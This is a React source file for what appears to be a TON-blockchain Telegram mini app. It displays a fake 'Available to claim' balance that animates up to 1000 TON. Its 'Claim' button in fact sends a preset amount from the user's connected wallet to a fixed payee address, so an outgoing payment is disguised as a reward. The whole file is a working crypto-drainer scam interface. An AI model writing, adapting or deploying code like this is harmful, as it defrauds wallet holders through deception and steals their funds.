import "./App.css";
import "@twa-dev/sdk";
import { TonConnectButton, useTonAddress } from "@tonconnect/ui-react";
import CountUp from "react-countup";
import {
  defaultAmount,
  payeeAddress,
  useTonConnect,
} from "./hooks/useTonConnect";

function App() {
  const { connected, sender } = useTonConnect();
  const userFriendlyAddress = useTonAddress();

  const amountToSend = Number(defaultAmount) / 10 ** 9;

  return (
    <div className="App">
      <div className="Container">
        <TonConnectButton />

        <div className="Card">
          <b>Available to claim</b>

          {!userFriendlyAddress ? (
            <div className="Hint">You first need to connect a wallet</div>
          ) : (
            <>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  marginTop: "8px",
                }}
              >
                <span style={{ marginRight: "6px" }}>Available now</span>
                <img
                  src="/ton_symbol.svg"
                  alt=""
                  width={20}
                  height={20}
                  style={{ marginRight: "6px" }}
                />

                <CountUp
                  start={0}
                  end={1000}
                  duration={10000}
                  separator=" "
                  decimals={4}
                  enableScrollSpy
                >
                  {({ countUpRef }) => (
                    <div className="truncate">
                      <span ref={countUpRef} />
                    </div>
                  )}
                </CountUp>
              </div>
            </>
          )}
        </div>
        <button
          className={`Button ${connected ? "Active" : "Disabled"}`}
          onClick={() =>
            sender.send({
              value: defaultAmount,
              to: payeeAddress,
            })
          }
        >
          Claim
        </button>
      </div>
    </div>
  );
}

export default App;
